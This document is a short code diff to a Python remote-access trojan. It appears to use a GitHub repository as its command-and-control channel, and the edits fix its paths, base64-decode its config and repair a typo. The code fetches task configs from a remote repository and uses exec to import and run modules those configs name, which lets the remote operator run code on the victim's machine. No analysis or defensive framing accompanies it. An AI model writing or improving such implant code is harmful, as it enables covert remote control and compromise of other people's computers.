@@ -21,7 +21,7 @@ def github_connect():
 
 
 def get_file_contents(dirname, module_name, repo):
-    return repo.file_contents(f"{dirname}/{module_name}").content
+    return repo.file_contents(f"/github_c2/{dirname}/{module_name}").content
 
 
 class GitImporter:
@@ -59,18 +59,18 @@ class Trojan:
     def __init__(self, id):
         self.id = id
         self.config_file = f"{id}.json"
-        self.data_path = f"data/{id}/"
+        self.data_path = f"./data/{id}/"
         self.repo = github_connect()
     
     def get_config(self):
         config_json = get_file_contents(
             "config", self.config_file, self.repo
         )
-        
-        config = json.loads(config_json)
+
+        config = json.loads(base64.b64decode(config_json))
         
         for task in config:
-            if task["module"] not in sys.moudles:
+            if task["module"] not in sys.modules:
                 exec("import %s" % task["module"])
         
         return config
